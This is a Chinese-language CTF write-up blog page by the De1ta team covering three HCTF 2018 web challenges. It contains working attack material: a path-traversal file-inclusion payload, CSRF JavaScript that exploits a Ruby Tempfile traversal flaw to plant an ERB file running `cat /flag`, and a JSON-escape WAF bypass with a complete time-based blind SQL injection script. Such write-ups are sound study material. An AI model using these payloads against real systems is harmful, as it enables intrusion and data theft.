<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="HCTF 2018 Writeup">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>HCTF 2018 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2018/11/12/HCTF2018/">
                HCTF 2018 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-11-12</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="De1ta-Team"><a href="#De1ta-Team" class="headerlink" title=" De1ta-Team"></a> <strong>De1ta-Team</strong></h1><a id="more"></a>
<blockquote>
<p>Team: De1ta</p>
</blockquote>
<p>首先感谢杭电的师傅们为我们带来了一场精彩的CTF比赛，出题和运维的大佬们都辛苦了！</p>
<p>顺便打个小广告：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系ZGUxdGFAcHJvdG9ubWFpbC5jb20=</p>
<p>[TOC]</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>参考：<a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/" target="_blank" rel="noopener">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/</a><br>在source.php可以看到源码<br>要使<code>emmm::checkFile($_REQUEST[&#39;file&#39;])</code>返回true，利用?截取hint.php，利用/使<code>hint.php?</code>成为一个不存在的目录，最后include利用<code>../../</code>跳转目录读取flag。<br>payload: <code>hint.php?/../../../../../../../../../../../ffffllllaaaagggg</code><br>payload还可以：<code>index.php?file=source.php?/../../../../../../../../../../../ffffllllaaaagggg</code>一个道理</p>
<blockquote>
<p><code>hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}</code></p>
</blockquote>
<h2 id="share"><a href="#share" class="headerlink" title="share"></a>share</h2><p>打开题目，主页翻译一下可以得到这些信息</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_00.png" alt><br>是个让用户分享应用的网站，并且管理员可以把应用推给某个用户</p>
<p>/Alphatest可以看到一个filenumber 和自己的uid</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_01.png" alt></p>
<p>/share 可以分享东西给管理员，猜测存在xss，context框传了个段xss代码，发现能接收到admin的请求，bot是PhantomJS/2.1.1，说明能执行js，但是开了httponly打不到cookie，猜测是要CSRF，url框传的东西好像没啥用</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_02.png" alt="enter description here"></p>
<p>根据主页提示可能有源码泄漏，在robots.txt 看到了三个接口的代码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#this terrible code</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileController</span> &lt; ApplicationController</span></span><br><span class="line">  before_action <span class="symbol">:authenticate_user!</span></span><br><span class="line">  before_action <span class="symbol">:authenticate_role</span></span><br><span class="line">  before_action <span class="symbol">:authenticate_admin</span></span><br><span class="line">  protect_from_forgery <span class="symbol">:except</span> =&gt; [<span class="symbol">:upload</span> , <span class="symbol">:share_people_test</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># post /file/upload</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">upload</span></span></span><br><span class="line">    <span class="keyword">if</span>(params[<span class="symbol">:file</span>][<span class="symbol">:myfile</span>] != <span class="literal">nil</span> &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:myfile</span>] != <span class="string">""</span>)</span><br><span class="line">      file = params[<span class="symbol">:file</span>][<span class="symbol">:myfile</span>]</span><br><span class="line">      name = Base64.decode64(file.original_filename)</span><br><span class="line">      ext = name.split(<span class="string">'.'</span>)[-<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">if</span> ext == name <span class="params">||</span> ext ==<span class="literal">nil</span></span><br><span class="line">        ext=<span class="string">""</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      share = Tempfile.new(name.split(<span class="string">'.'</span>+ext)[<span class="number">0</span>],Rails.root.to_s+<span class="string">"/public/upload"</span>)</span><br><span class="line">      share.write(Base64.decode64(file.read))</span><br><span class="line">      share.close</span><br><span class="line">      File.rename(share.path,share.path+<span class="string">"."</span>+ext)</span><br><span class="line">      tmp = Sharefile.new</span><br><span class="line">      tmp.public = <span class="number">0</span></span><br><span class="line">      tmp.path = share.path</span><br><span class="line">      tmp.name = name</span><br><span class="line">      tmp.tempname= share.path.split(<span class="string">'/'</span>)[-<span class="number">1</span>]+<span class="string">"."</span>+ext</span><br><span class="line">      tmp.context = params[<span class="symbol">:file</span>][<span class="symbol">:context</span>]</span><br><span class="line">      tmp.save</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    redirect_to root_path</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># post /file/Alpha_test</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">Alpha_test</span></span></span><br><span class="line">    <span class="keyword">if</span>(params[<span class="symbol">:fid</span>] != <span class="string">""</span> &amp;&amp; params[<span class="symbol">:uid</span>] != <span class="string">""</span> &amp;&amp; params[<span class="symbol">:fid</span>] != <span class="literal">nil</span> &amp;&amp; params[<span class="symbol">:uid</span>] != <span class="literal">nil</span>)</span><br><span class="line">      fid = params[<span class="symbol">:fid</span>].to_i</span><br><span class="line">      uid = params[<span class="symbol">:uid</span>].to_i</span><br><span class="line">      <span class="keyword">if</span>(fid &gt; <span class="number">0</span> &amp;&amp; uid &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span>(Sharelist.find_by(<span class="symbol">sharefile_id:</span> fid)==<span class="literal">nil</span>)</span><br><span class="line">          <span class="keyword">if</span>(Sharelist.count(<span class="string">"user_id = ?"</span>, uid.to_s) &lt;<span class="number">5</span>)</span><br><span class="line">            share = Sharelist.new</span><br><span class="line">            share.sharefile_id = fid</span><br><span class="line">            share.user_id = uid</span><br><span class="line">            share.save</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    redirect_to(root_path)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">share_file_to_all</span></span></span><br><span class="line">    file = Sharefile.find(params[<span class="symbol">:fid</span>])</span><br><span class="line">    File.rename(file.path,Rails.root+<span class="string">"/public/download/"</span>+file.name)</span><br><span class="line">    file.public = <span class="literal">true</span></span><br><span class="line">    file.path = Rails.root+<span class="string">"/public/download/"</span>+file.name</span><br><span class="line">    file.save</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>分析一下这段代码，<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before_action <span class="symbol">:authenticate_user!</span></span><br><span class="line">before_action <span class="symbol">:authenticate_role</span></span><br><span class="line">before_action <span class="symbol">:authenticate_admin</span></span><br></pre></td></tr></table></figure></p>
<p>首先三个接口都是管理员才能调用</p>
<p>第一个接口/file/upload 能够上传文件<br>第二个接口/file/Alpha_test 能够分配一个文件给一个用户<br>第三个是把文件公开，但是没有提供外部调用路由</p>
<p>后面 hint1给了文件结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">views</span><br><span class="line">|-- devise</span><br><span class="line">|   |-- confirmations</span><br><span class="line">|   |-- mailer</span><br><span class="line">|   |-- passwords</span><br><span class="line">|   |-- registrations</span><br><span class="line">|   |   `-- new.html.erb</span><br><span class="line">|   |-- sessions</span><br><span class="line">|   |   `-- new.html.erb</span><br><span class="line">|   |-- shared</span><br><span class="line">|   `-- unlocks</span><br><span class="line">|-- file</span><br><span class="line">|-- home</span><br><span class="line">|   |-- Alphatest.erb</span><br><span class="line">|   |-- addtest.erb</span><br><span class="line">|   |-- home.erb</span><br><span class="line">|   |-- index.html.erb</span><br><span class="line">|   |-- publiclist.erb</span><br><span class="line">|   |-- share.erb</span><br><span class="line">|   `-- upload.erb</span><br><span class="line">|-- layouts</span><br><span class="line">|   |-- application.html.erb</span><br><span class="line">|   |-- mailer.html.erb</span><br><span class="line">|   `-- mailer.text.erb</span><br><span class="line">`-- recommend</span><br><span class="line">     `-- show.erb</span><br></pre></td></tr></table></figure></p>
<p>hint2给了一个主页的代码<br><code>&lt;%= render template: &quot;home/&quot;+params[:page] %&gt;</code><br>参考<br><a href="http://blog.neargle.com/SecNewsBak/drops/Ruby%20on%20Rails%20%E5%8A%A8%E6%80%81%E6%B8%B2%E6%9F%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28CVE.html" target="_blank" rel="noopener">http://blog.neargle.com/SecNewsBak/drops/Ruby%20on%20Rails%20%E5%8A%A8%E6%80%81%E6%B8%B2%E6%9F%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28CVE.html</a><br>尝试跨目录包含文件失败，应该是只能包含home目录下的文件</p>
<p>hint3给了ruby版本2.5.0<br>通过查找ruby版本号，结合robots代码，主页代码和目录结构，可以确定要利用的是这个CVE：<br>CVE-2018-6914: Unintentional file and directory creation with directory traversal in tempfile and tmpdir<br>大概意思就是在Tempfile 创建文件时如果传入(../)就能创建任意目录或文件<br>想到可以传个文件到home下，结合主页的文件包含，即可RCE</p>
<p>整个思路就很清晰了：</p>
<ol>
<li>CSRF 让admin调用/file/upload 接口上传带有恶意文件名的文件</li>
<li>Tmpfile漏洞使得文件生成在/views/home/目录下，但是新生成的文件名有部分是随机的</li>
<li>CSRF 调用/file/Alpha_test 接口把文件分配到自己的id下，在/Alphatest拿到生成的文件名</li>
<li>主页文件包含，RCE</li>
</ol>
<p>于是开始了艰难的构造payload<br>最后上传的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;http://code.jquery.com/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function upload(i) &#123;</span><br><span class="line">var test=$(&apos;meta&apos;).eq(1).attr(&quot;content&quot;);</span><br><span class="line">var url=&quot;/file/upload&quot;;</span><br><span class="line">  var data=&quot;-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;file[myfile]\&quot;; filename=\&quot;Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\&quot;\x0d\x0a\</span><br><span class="line">Content-Type: application/text\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;file[context]\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">de1ta\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;authenticity_token\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">&quot;+test+&quot;\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;commit\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">submit\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835\x0d\x0a\</span><br><span class="line">Content-Disposition: form-data; name=\&quot;utf8\&quot;\x0d\x0a\</span><br><span class="line">\x0d\x0a\</span><br><span class="line">✓\x0d\x0a\</span><br><span class="line">-----------------------------13025814701038468772945051835--&quot;;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">   url: url,</span><br><span class="line">   type:&quot;POST&quot;,</span><br><span class="line">   headers: &#123;</span><br><span class="line">       &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------13025814701038468772945051835&quot;,</span><br><span class="line">       &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   data:data,</span><br><span class="line">   contentType:false,</span><br><span class="line">   success:function(res)&#123;</span><br><span class="line">   &#125;,</span><br><span class="line">   error:function(err)&#123;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"> &#125;</span><br><span class="line"> for(var i=1;i&lt;2;i++)</span><br><span class="line"> &#123;</span><br><span class="line">    upload(i);</span><br><span class="line"> &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>文件内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= `cat /flag` %&gt;</span><br></pre></td></tr></table></figure></p>
<p>文件名为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../app/views/home/de1taxishir.erbss.erb</span><br></pre></td></tr></table></figure></p>
<p>推送文件到我的uid下的代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;http://code.jquery.com/jquery-1.11.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function go(fffid)&#123;</span><br><span class="line">  var test=$(&apos;meta&apos;).eq(1).attr(&quot;content&quot;);</span><br><span class="line">  console.log(test);</span><br><span class="line">  var params = &#123;utf8:&quot;\xE2\x9C\x93&quot;,authenticity_token:test,uid:2,fid:fffid,commit:&quot;submit&quot;&#125;;</span><br><span class="line">  var url = &apos;/file/Alpha_test&apos;;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">   url : url,</span><br><span class="line">   type : &quot;POST&quot;,</span><br><span class="line">   data : params,</span><br><span class="line">   success : function(result) &#123;</span><br><span class="line">   &#125;,</span><br><span class="line">   error:function(result)&#123;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i=1;i&lt;20;i+=1)&#123;</span><br><span class="line">  go(i);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里因为不知道文件id是多少，只能根据前面的filenumber来爆破一下，所以写了个for循环<br>最后上传上去并获取文件名后，在主页进行文件包含执行命令，读取flag</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/share_03.png" alt></p>
<p>ps：这道题有个搅shi bug，利用推文件给用户接口，无限暴力推fid到自己的uid下，就能看到别人上传的文件，并且别人就不知道他的文件名是啥了</p>
<p>还有就是js构造一个文件上传太坑了，一开始用new File，一直失败，后面发现是PhantomJS不支持这个h5的类好像，于是硬生生写了个multipart/form-data 出来</p>
<blockquote>
<p><code>flag:hctf{8f4c57063ddb7b106e03e25f7d1bb813}</code></p>
</blockquote>
<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p>打开发现是一个QQ钓鱼站，主页会跳转到空间<br><a href="http://kzone.2018.hctf.io/www.zip" target="_blank" rel="noopener">http://kzone.2018.hctf.io/www.zip</a> 可以下载到源码<br>install.sql 文件中有admin密码，admn。<br>INSERT INTO <code>fish_admin</code> (<code>id</code>, <code>username</code>, <code>password</code>, <code>name</code>, <code>qq</code>, <code>per</code>) VALUES<br>(1, ‘admin’, ‘21232f297a57a5a743894a0e4a801fc3’, ‘小杰’, ‘1503816935’, 1);<br>不过登陆不上去，密码被改了</p>
<p>审计源码翻到了member.php，发现这边没有addslashes，并且无需登录也可访问</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/kzone_00.png" alt></p>
<p>可以看到这段代码从cookie获取了登陆信息，如果符合几个if，就能登陆<br>想到通过注入 ，union select 替换掉admin_user和admin_pass<br>尝试构造弱类型绕过：<br><code>Cookie: PHPSESSID=s33h9c1u8bq5t0r8s4dura0c76; islogin=1; login_data={&quot;admin_user&quot;:&quot;admin&#39;||&#39;1&quot;,&quot;admin_pass&quot;:65}</code><br>（一开始没构造出来，然后就转思路去bypass waf了</p>
<p>参考这篇文章<br><a href="http://blog.sina.com.cn/s/blog_1574497330102wruv.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_1574497330102wruv.html</a><br>虽然他没绕过关键词检测，但是顺着他的思路尝试构造了<br> \u0075nion，本地测试发现json_decode后变为union，成功bypass waf<br>构造一个sleep的cookie，放到服务端测试也sleep了，证明此处注入可行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:PHPSESSID=t0k91etf5fecbi4t25d7hprtm3;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;admin111&apos;/**/\u0075nion/**/select/**/1,2,3,4,5,6/**/from/**/fish_admin/**/where/**/\u0073leep(3)\u003d&apos;1&quot;,&quot;admin_pass&quot;:&quot;3b30a11aaba222edd6e704e9959b94643ed4ffd9&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/kzone_01.png" alt></p>
<p>后面就把所有关键词用这种方法绕过，就能直接注入了，最后flag在 F1444g表的F1a9字段<br>附上注入脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#!coding:utf-8#</span></span><br><span class="line"><span class="comment"># xishir</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment">#hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span></span><br><span class="line"></span><br><span class="line">ss = <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+"</span></span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/"</span></span><br><span class="line"><span class="comment">#url="http://127.0.0.1/hctf/www/admin/"</span></span><br><span class="line"></span><br><span class="line">union = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'u'</span>)))[<span class="number">2</span>:]+<span class="string">'nion'</span></span><br><span class="line">sleep = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'leep'</span></span><br><span class="line">ascii = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'a'</span>)))[<span class="number">2</span>:]+<span class="string">'scii'</span></span><br><span class="line">ok = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'='</span>)))[<span class="number">2</span>:]</span><br><span class="line">substr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'s'</span>)))[<span class="number">2</span>:]+<span class="string">'ubstr'</span></span><br><span class="line">over = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'#'</span>)))[<span class="number">2</span>:]</span><br><span class="line">blank = <span class="string">"/**/"</span></span><br><span class="line">orr = <span class="string">'\u00'</span>+str(hex(ord(<span class="string">'o'</span>)))[<span class="number">2</span>:]+<span class="string">'r'</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ss:</span><br><span class="line">        payload = <span class="string">"admin' and (substr((select binary F1a9 from F1444g limit 1),"</span>+str(i)+<span class="string">",1)='"</span>+str(j)+<span class="string">"') and sleep(4) and 1='1"</span></span><br><span class="line"></span><br><span class="line">        payload = payload.replace(<span class="string">'sleep'</span>,sleep)</span><br><span class="line">        payload = payload.replace(<span class="string">'union'</span>,union)</span><br><span class="line">        payload = payload.replace(<span class="string">'='</span>,ok)</span><br><span class="line">        payload = payload.replace(<span class="string">'#'</span>,over)</span><br><span class="line">        payload = payload.replace(<span class="string">' '</span>,blank)</span><br><span class="line">        payload = payload.replace(<span class="string">'ascii'</span>,ascii)</span><br><span class="line">        payload = payload.replace(<span class="string">'substr'</span>,substr)</span><br><span class="line">        payload = payload.replace(<span class="string">'or'</span>,orr)</span><br><span class="line"></span><br><span class="line">        jsons = <span class="string">'&#123;"admin_user":"'</span>+payload+<span class="string">'","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"&#125;'</span></span><br><span class="line"></span><br><span class="line">        cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"t0k91etf5fecbi4t25d7hprtm3"</span>,</span><br><span class="line">        <span class="string">"islogin"</span>:<span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"login_data"</span>:jsons&#125;</span><br><span class="line"></span><br><span class="line">        t1=time.time()</span><br><span class="line">        r1 = r.get(<span class="string">"http://kzone.2018.hctf.io"</span>,cookies=cookie)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="comment">#print t2</span></span><br><span class="line">        <span class="keyword">if</span> (t2-t1)&gt;<span class="number">4</span>:</span><br><span class="line">            <span class="comment">#print "aaaaaaaa"</span></span><br><span class="line">            flag+=str(j)</span><br><span class="line">            <span class="keyword">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Web/kzone_02.png" alt="enter description here"></p>
